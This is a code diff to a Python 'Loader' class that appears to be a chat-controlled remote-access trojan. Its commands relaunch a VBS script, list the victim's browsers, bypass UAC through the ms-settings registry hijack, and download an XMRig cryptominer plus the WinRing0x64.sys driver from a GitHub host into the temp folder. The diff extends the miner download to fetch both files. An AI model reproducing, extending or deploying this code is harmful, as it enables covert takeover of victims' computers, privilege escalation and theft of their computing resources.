@@ -86,7 +86,7 @@ class Loader():
 						filename = os.path.abspath(__file__).split("\\")
 						filename.pop()
 						filename = "\\".join(filename) + "\\Main.vbs"
-						os.system("cmd.exe /c taskkill /F /IM python.exe && " + filename)
+						os.system("cmd.exe /c taskkill /F /IM PID " + str(os.getpid()) + " /F && " + filename)
 					elif command == "/execute" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						spl = message['text'].split(" ")
 						spl.remove(spl[0])
@@ -116,6 +116,7 @@ class Loader():
 								except:
 									break
 								browsers += "%E2%9D%96 " + borwser + "\n"
+						browsers = browsers.replace("\n\n","\n")
 						self.SendMessage("%F0%9F%8C%90 Browsers List : \n" + browsers)
 					elif command == "/bypass_uac" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
@@ -155,11 +156,13 @@ class Loader():
 							self.SendMessage("%E2%9C%96%EF%B8%8F Need Administrator Privileges")
 					elif command == "/download_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						self.SendMessage("%E2%9C%94%EF%B8%8F Downloading Miner...")
-						req = requests.get('https://raw.githubusercontent.com/MohamadXo213/Down-X/main/xmrig.exe')
-						filename = tempfile.gettempdir() + "\\xmrig.exe"
-						file = open(filename,"wb")
-						file.write(req.content)
-						file.close()
+						links = ["https://raw.githubusercontent.com/MohamadXo213/Down-X/main/xmrig.exe","https://raw.githubusercontent.com/MohamadXo213/Down-X/main/WinRing0x64.sys"]
+						for link in links:
+							req = requests.get(link)
+							filename = tempfile.gettempdir() + "\\" + link.split("/")[-1]
+							file = open(filename,"wb")
+							file.write(req.content)
+							file.close()
 						self.SendMessage("%E2%9C%94%EF%B8%8F Miner Downloaded")
 					elif command == "/start_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						if os.path.exists(tempfile.gettempdir() + "\\xmrig.exe"):
